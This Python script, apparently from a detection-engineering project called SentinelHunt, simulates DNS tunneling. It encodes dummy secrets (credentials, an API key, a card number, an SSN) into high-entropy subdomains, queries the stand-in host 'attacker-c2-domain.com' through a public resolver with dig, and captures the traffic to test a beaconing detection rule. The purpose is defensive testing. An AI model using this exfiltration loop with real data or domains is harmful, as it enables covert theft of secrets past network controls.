#!/usr/bin/env python3
"""
DNS Tunneling Attack Simulation

Purpose:
- Simulate DNS tunneling for C2 communication or data exfiltration
- Generate high-entropy DNS queries with deep subdomain structures
- Should trigger DNS_BEACONING detection rule

Technique:
- Encodes data in DNS queries
- Uses TXT records for responses
- Mimics real-world DNS tunneling tools (iodine, dnscat2)

Run from: Kali Linux or WSL
"""

import time
import random
import string
import subprocess
import base64
from datetime import datetime

# ========================================
# CONFIGURATION
# ========================================
DNS_SERVER = "8.8.8.8"  # Google DNS (or use your local DNS)
DOMAIN = "attacker-c2-domain.com"  # Fake C2 domain
DURATION_SECONDS = 60  # Duration of attack
QUERY_INTERVAL = 0.5  # Seconds between queries
PCAP_OUTPUT = f"dns_tunnel_attack_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap"

print("=" * 60)
print("  SENTINELHUNT DNS TUNNELING SIMULATION")
print("=" * 60)
print(f"[+] DNS Server: {DNS_SERVER}")
print(f"[+] C2 Domain: {DOMAIN}")
print(f"[+] Duration: {DURATION_SECONDS}s")
print(f"[+] PCAP Output: {PCAP_OUTPUT}")
print("")

# ========================================
# HELPER FUNCTIONS
# ========================================

def generate_high_entropy_subdomain(length=32):
    """Generate random high-entropy subdomain (base64-like)"""
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def encode_data_in_dns(data):
    """Encode data for DNS tunneling"""
    # Simulate encoding data in subdomain
    encoded = base64.b64encode(data.encode()).decode()
    # Remove padding and replace special chars
    encoded = encoded.replace('=', '').replace('+', '').replace('/', '')
    return encoded[:63]  # DNS label limit

def create_dns_query(subdomain, domain):
    """Create DNS query FQDN"""
    return f"{subdomain}.{domain}"

# ========================================
# SIMULATED DATA EXFILTRATION
# ========================================

EXFIL_DATA = [
    "Sensitive File: passwords.txt",
    "Database credentials: admin:P@ssw0rd",
    "API key: sk_live_abc123xyz789",
    "Credit card: 4532-1234-5678-9012",
    "SSH private key header",
    "Confidential project data",
    "Employee SSN: 123-45-6789",
    "Internal IP: 10.0.50.100",
]

# ========================================
# START PACKET CAPTURE
# ========================================
print("[+] Starting packet capture (requires sudo)...")
try:
    tcpdump_process = subprocess.Popen(
        ['sudo', 'tcpdump', '-i', 'any', '-w', PCAP_OUTPUT, 'port 53'],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    time.sleep(2)  # Wait for tcpdump to start
    print("[+] Packet capture started")
except Exception as e:
    print(f"[!] Failed to start tcpdump: {e}")
    print("[!] Continuing without packet capture...")
    tcpdump_process = None

# ========================================
# GENERATE DNS TUNNELING TRAFFIC
# ========================================
print("\n[+] Starting DNS tunneling attack...\n")

start_time = time.time()
query_count = 0

try:
    while (time.time() - start_time) < DURATION_SECONDS:
        # Choose data to exfiltrate
        data_chunk = random.choice(EXFIL_DATA)
        
        # Encode data in subdomain
        encoded_subdomain = encode_data_in_dns(data_chunk)
        
        # Create deep subdomain structure (characteristic of DNS tunneling)
        subdomain_parts = [
            encoded_subdomain[:16],
            encoded_subdomain[16:32],
            generate_high_entropy_subdomain(8)
        ]
        full_subdomain = '.'.join(subdomain_parts)
        
        # Create full DNS query
        dns_query = create_dns_query(full_subdomain, DOMAIN)
        
        # Execute DNS query using dig
        try:
            subprocess.run(
                ['dig', '+short', f'@{DNS_SERVER}', dns_query, 'A'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=2
            )
            query_count += 1
            
            # Progress indicator
            elapsed = time.time() - start_time
            print(f"\r[{elapsed:5.1f}s] Queries sent: {query_count} | Query: {dns_query[:50]}...", end='', flush=True)
            
        except subprocess.TimeoutExpired:
            pass
        except Exception as e:
            print(f"\n[!] Query failed: {e}")
        
        time.sleep(QUERY_INTERVAL)

except KeyboardInterrupt:
    print("\n\n[!] Attack interrupted by user")

# ========================================
# STOP PACKET CAPTURE
# ========================================
print("\n\n[+] Stopping attack...")
time.sleep(2)

if tcpdump_process:
    print("[+] Stopping packet capture...")
    tcpdump_process.terminate()
    tcpdump_process.wait()

# ========================================
# ATTACK SUMMARY
# ========================================
print("\n" + "=" * 60)
print("  ATTACK COMPLETE")
print("=" * 60)
print(f"[+] Total DNS queries: {query_count}")
print(f"[+] Duration: {time.time() - start_time:.1f} seconds")
print(f"[+] PCAP file: {PCAP_OUTPUT}")
print("")
print("Expected detections:")
print("  ✓ High DNS entropy (3.5+)")
print("  ✓ Deep subdomain structure (3+ levels)")
print("  ✓ High query frequency")
print("  ✓ DNS_BEACONING rule trigger")
print("")
print("Next steps:")
print("  1. Transfer PCAP to SentinelHunt:")
print(f"     scp {PCAP_OUTPUT} user@wsl:/path/to/datasets/raw/attack/")
print("  2. Run feature extraction")
print("  3. Verify detection alerts")
print("=" * 60)
